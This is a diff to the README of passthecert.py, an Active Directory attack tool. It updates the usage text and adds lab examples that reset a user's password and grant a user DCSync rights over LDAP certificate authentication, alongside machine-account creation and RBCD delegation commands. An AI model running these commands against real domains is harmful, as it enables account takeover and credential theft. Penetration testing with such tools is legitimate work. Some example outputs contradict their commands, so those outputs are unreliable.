@@ -23,50 +23,49 @@ Usage
 ```
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
-usage: passthecert.py [-h] [-debug] [-port {389,636}] [-action [{add_computer,del_computer,modify_computer,read_rbcd,write_rbcd,remove_rbcd,flush_rbcd,forcePWDchange,whoami}]] [-account-name sAMAccountName] [-new-pass password] [-baseDN DC=test,DC=local] [-computer-group CN=Computers] [-domain test.local] [-domain-netbios NETBIOSNAME] [-computer-name COMPUTER-NAME$] [-computer-pass password]
-                      [-delegated-services cifs/srv01.domain.local,ldap/srv01.domain.local] [-delegate-to DELEGATE_TO] [-delegate-from DELEGATE_FROM] [-dc-host hostname] [-dc-ip ip] -crt user.crt -key user.key
+usage: passthecert.py [-h] [-debug] [-port {389,636}]
+                      [-action [{add_computer,del_computer,modify_computer,read_rbcd,write_rbcd,remove_rbcd,flush_rbcd,modify_user,whoami}]]
+                      [-target sAMAccountName] [-new-pass [Password]] [-elevate] [-baseDN DC=test,DC=local]
+                      [-computer-group CN=Computers] [-domain test.local] [-domain-netbios NETBIOSNAME]
+                      [-computer-name COMPUTER-NAME$] [-computer-pass password]
+                      [-delegated-services cifs/srv01.domain.local,ldap/srv01.domain.local] [-delegate-to DELEGATE_TO]
+                      [-delegate-from DELEGATE_FROM] [-dc-host hostname] [-dc-ip ip] -crt user.crt -key user.key
 
 Manage domain computers and perform RBCD attack via LDAP certificate authentication
 
-optional arguments:
+options:
   -h, --help            show this help message and exit
   -debug                Turn DEBUG output ON
   -port {389,636}       Destination port to connect to. LDAPS (via StartTLS) on 386 or LDAPS on 636.
 
 Action:
-  -action [{add_computer,del_computer,modify_computer,read_rbcd,write_rbcd,remove_rbcd,flush_rbcd,forcePWDchange,whoami}]
+  -action [{add_computer,del_computer,modify_computer,read_rbcd,write_rbcd,remove_rbcd,flush_rbcd,modify_user,whoami}]
 
-Password Reset:
-  -account-name sAMAccountName
-                        sAMAccountName of user to target.
-  -new-pass password    New password of target.
+Manage User:
+  -target             sAMaccountnames   sAMAccountName of user to target.
+  -new-pass           [Password]        New password of target.
+  -elevate                              Grant target account DCSYNC rights
 
 Manage Computer:
-  -baseDN DC=test,DC=local
-                        Set baseDN for LDAP.If ommited, the domain part (FQDN) specified in the account parameter will be used.
-  -computer-group CN=Computers
-                        Group to which the account will be added.If omitted, CN=Computers will be used,
-  -domain test.local    Target domain fqdn
-  -domain-netbios NETBIOSNAME
-                        Domain NetBIOS name. Required if the DC has multiple domains.
-  -computer-name COMPUTER-NAME$
-                        Name of computer to add.If omitted, a random DESKTOP-[A-Z0-9]{8} will be used.
-  -computer-pass password
-                        Password to set to computer. If omitted, a random [A-Za-z0-9]{32} will be used.
-  -delegated-services cifs/srv01.domain.local,ldap/srv01.domain.local
-                        Services to configure in constrained delegation to configure to the new computer (no space in the list)
+  -baseDN             DC=test,DC=local  Set baseDN for LDAP.If omitted, the domain part (FQDN) specified in the account parameter will be used.
+  -computer-group     CN=Computers      Group to which the account will be added.If omitted, CN=Computers will be used,
+  -domain             test.local        Target domain fqdn
+  -domain-netbios     NETBIOSNAME       Domain NetBIOS name. Required if the DC has multiple domains.
+  -computer-name      COMPUTER-NAME$    Name of computer to add.If omitted, a random DESKTOP-[A-Z0-9]{8} will be used.
+  -computer-pass      password          Password to set to computer. If omitted, a random [A-Za-z0-9]{32} will be used.
+  -delegated-services cifs/srv01.domain.local,ldap/srv01.domain.local Services to configure in constrained delegation to configure to the new computer (no space in the list)
 
 RBCD attack:
-  -delegate-to DELEGATE_TO
-                        Target computer account the attacker has at least WriteProperty to
-  -delegate-from DELEGATE_FROM
-                        Attacker controlled machine account to write on the msDS-Allo[...] property (only when using `-action write`)
+  -delegate-to        DELEGATE_TO       Target computer account the attacker has at least WriteProperty to
+  -delegate-from      DELEGATE_FROM     Attacker controlled machine account to write on the msDS-Allo[...] property (only when using `-action write`)
 
 Authentication:
-  -dc-host hostname     Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the account parameter will be used
+  -dc-host hostname     Hostname of the domain controller to use. If omitted, the domain part (FQDN) specified in the account
+                        parameter will be used
   -dc-ip ip             IP of the domain controller to use. Useful if you can't translate the FQDN.
   -crt user.crt         User's certificate
   -key user.key         User's private key
+
 ```
 
 Actions
@@ -98,7 +97,7 @@ Create a computer via LDAPS:
 
 ```console
 $ python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation
 
 [*] Successfully added machine account DESKTOP-CKDRXFUX$ with password dzy3pjZqEH6f4Igql5dp4I5Dx8uA4PrV.
 ```
@@ -107,7 +106,7 @@ Create a computer via LDAPS with custom name/password:
 
 ```console
 $ python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -computer-name OFFSECMACHINE$ -computer-pass SheSellsSeaShellsOnTheSeaShore
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation
 
 [*] Successfully added machine account OFFSECMACHINE$ with password SheSellsSeaShellsOnTheSeaShore.
 ```
@@ -126,7 +125,7 @@ Add a delegation right via StartTLS on port 389:
 
 ```console
 $ python3 passthecert.py -action write_rbcd -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -port 389 -delegate-to DESKTOP-CKDRXFUX$ -delegate-from SRV-MAIL$
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation
 
 [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
 [*] Delegation rights modified successfully!
@@ -134,6 +133,25 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [*] Accounts allowed to act on behalf of other identity:
 [*]     SRV-MAIL$    (S-1-5-21-XXXXXXXXX-YYYYYYYYYY-WWWWWWWW-1109)
 ```
+
+Change a password of a user 
+
+```console
+$ python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -target user_sam -new-pass
+Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation
+
+[*] Successfully changed kpayne password to: ZqIrfZdt02OIq5Ek0ZZPcQKRWKEMEOKB
+```
+
+Elevate a user fpr DCSYNC
+
+```console
+$ python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -target user_sam -elevate
+Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation
+
+[*] Granted user 'user_sam' DCSYNC rights!
+```
+
 
 Credits
 -------
